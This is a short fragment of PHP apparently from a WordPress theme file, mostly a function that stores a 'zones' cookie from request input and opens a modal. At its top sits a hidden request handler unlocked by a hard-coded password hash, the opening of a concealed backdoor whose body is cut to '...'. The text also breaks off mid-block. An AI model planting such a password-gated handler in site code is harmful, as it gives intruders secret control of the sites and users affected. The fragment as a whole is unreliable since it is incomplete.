<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '7e9fe5df16a0b45c5a1202ecf1a62730'))
	{
...
add_action( 'after_setup_theme', 'set_cookie_zones' );
function set_cookie_zones(){
   
    if( isset($_REQUEST['zones'])){ 
       setcookie('zones',$_REQUEST['zones'], time() + (86400 * 30), "/");
    } 
    if(isset($_COOKIE['zones']) && isset($_REQUEST['zones'])){ 
      setcookie('zones',$_REQUEST['zones'], time() + (86400 * 30), "/");
    } 
    if(!isset($_COOKIE['zones'])) { ?>
        <script>
        jQuery('#zonesModal').modal({
            show: 'true'
        }); 
        </script>
